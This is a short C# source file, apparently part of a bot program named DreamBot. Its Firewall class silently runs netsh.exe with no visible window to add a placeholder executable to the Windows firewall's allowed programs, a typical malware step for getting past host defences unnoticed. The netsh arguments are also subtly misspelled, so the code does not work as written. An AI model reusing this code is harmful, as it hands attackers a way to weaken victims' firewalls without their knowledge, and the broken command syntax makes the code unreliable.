using System.Diagnostics;

namespace DreamBot.System
{
    static class Firewall
    {
        public static void Construct()
        {
            var action = new Process {
                StartInfo = {
                    FileName = "netsh.exe", 
                    Arguments = string.Format("firewall adds allowedprogram programs=\"{0}\"", "exefilehere"), 
                    UseShellExecute = false, 
                    CreateNoWindow = true
                }
            };

            action.Start();
            action.WaitForExit();
        }
    }
}